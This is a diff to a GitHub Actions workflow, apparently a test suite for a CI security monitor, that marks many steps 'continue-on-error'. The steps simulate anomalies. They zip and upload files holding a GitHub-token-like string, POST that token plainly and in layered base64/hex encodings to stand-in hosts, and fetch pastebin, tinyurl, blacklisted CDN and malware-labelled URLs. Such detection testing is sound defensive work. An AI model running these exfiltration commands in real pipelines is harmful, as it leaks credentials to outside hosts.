@@ -149,6 +149,7 @@ jobs:
 
       #-----All other Anomalies---------------
       - name: docker
+        continue-on-error: true
         run: docker pull testcontainers/ryuk:0.12.0
 
 
@@ -173,6 +174,7 @@ jobs:
         run: echo "Suspicious content" > suspicious2.txt
 
       - name: Make cURL request
+        continue-on-error: true
         run: curl https://package-registry.free.beeceptor.com/packages
 
       - name: Simulate long-running task
@@ -194,10 +196,12 @@ jobs:
           
           
       - name: Response Status Code Policy (Trigger 400 Bad Request)
+        continue-on-error: true
         run: curl -k -X POST https://api.github.com/endpoint
 
 
       - name: 📝 Create and Compress the File
+        continue-on-error: true
         run: |
           # 1. Create a dummy file for the mock
           echo "-d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'" > dummy_file.txt
@@ -206,6 +210,7 @@ jobs:
           zip leaks.zip dummy_file.txt
           
       - name: 📝 Create and Compress the File With base64 secrets
+        continue-on-error: true
         run: |
           # 1. Create a dummy file for the mock
           echo "-d '{"data":{"GH":"WjJod1gwUkZSbnB0WnpkU1NISlJNbVZOWlRKSlJqUk9lRTVYVVc5a1dYQmhZak5XVFZoWVdBPT0="}}'" > dummy_file_64.txt
@@ -214,6 +219,7 @@ jobs:
           zip leaks64.zip dummy_file_64.txt
           
       - name: 🚀 Upload the generated Zip File
+        continue-on-error: true
         run: |
           # Since the 'zip' command ran in the root directory, 
           # the path is simply 'leaks.zip'
@@ -221,7 +227,8 @@ jobs:
             -F "file=@leaks.zip" \
             -H "Content-Type: application/form-data"
             
-      - name: 🚀 Upload the generated Zip File base64
+      - name: 🚀 Upload the generated Zip File base64 
+        continue-on-error: true
         run: |
           # Since the 'zip' command ran in the root directory, 
           # the path is simply 'leaks.zip'
@@ -230,40 +237,47 @@ jobs:
             -H "Content-Type: application/form-data"
             
       - name: Mock API key exposure request (Normal)
+        continue-on-error: true
         run: |
           curl -X POST https://normalsecrets.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'
 
       - name: Mock API key exposure request (HEX to BASE64)
+        continue-on-error: true
         run: |
           curl -X POST https://HEXtoBase64.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"Njc2ODcwNWY0NDQ1NDY3YTZkNjczNzUyNDg3MjUxMzI2NTRkNjUzMjQ5NDYzNDRlNzg0ZTU3NTE2ZjY0NTk3MDYxNjIzMzU2NGQ1ODU4NTg="}}'
 
       - name: Mock API key exposure request (HEX to BASE64 to HEX)
+        continue-on-error: true
         run: |
           curl -X POST https://HEXtoBase64toHEX.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"4e6a63324f4463774e5759304e4451314e44593359545a6b4e6a637a4e7a55794e4467334d6a55784d7a49324e54526b4e6a557a4d6a51354e44597a4e44526c4e7a67305a5455334e5445325a6a59304e546b334d4459784e6a497a4d7a55324e4751314f4455344e54673d"}}'
           
       - name: 3 level base64 encoding secrets
+        continue-on-error: true
         run: |
           curl -X POST https://base64encodedsecrets.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
           
       - name: hex encoded
+        continue-on-error: true
         run: |
           curl -X POST https://hexencodedsecrets.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
           
       - name: secrets on response
+        continue-on-error: true
         run: |
           curl -k https://pastebin.com/raw/V4FrgKcm
 
       - name: Send POST request with curl
+        continue-on-error: true
         run: |
           curl -X POST https://example.com/api \
             -H "Content-Type: application/json" \
@@ -273,6 +287,7 @@ jobs:
         run: curl https://www.google.com
 
       - name: Simple PUT request
+        continue-on-error: true
         run: |
           curl -X PUT https://example.com/api/resource \
           -H "Content-Type: application/json" \
@@ -288,6 +303,7 @@ jobs:
         run: curl http://example.com/test
 
       - name: Dummy PUT request (Unauthorized PUT Action)
+        continue-on-error: true
         run: |
           curl -X PUT "https://httpbin.org/put"
 
@@ -307,6 +323,7 @@ jobs:
         run: curl -s -L "https://tinyurl.com/invisirisk"
 
       - name: Content length download (Response Content Length)
+        continue-on-error: true
         run: curl -o 1GB.bin "https://nbg1-speed.hetzner.com/1GB.bin"
 
       - name: Install MALWARE package (in dataset) (Custom Builtins)
@@ -318,6 +335,7 @@ jobs:
         run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl.metadata
 
       - name: in Blacklisted URL (in dataset) (Custom Builtins)
+        continue-on-error: true
         run: curl -k https://cdn.jsdelivr.net/gh/Fabriziovigna11/mn-authz-x7/s5-r9
         
       # ============= InvisiRisk Cleanup =============
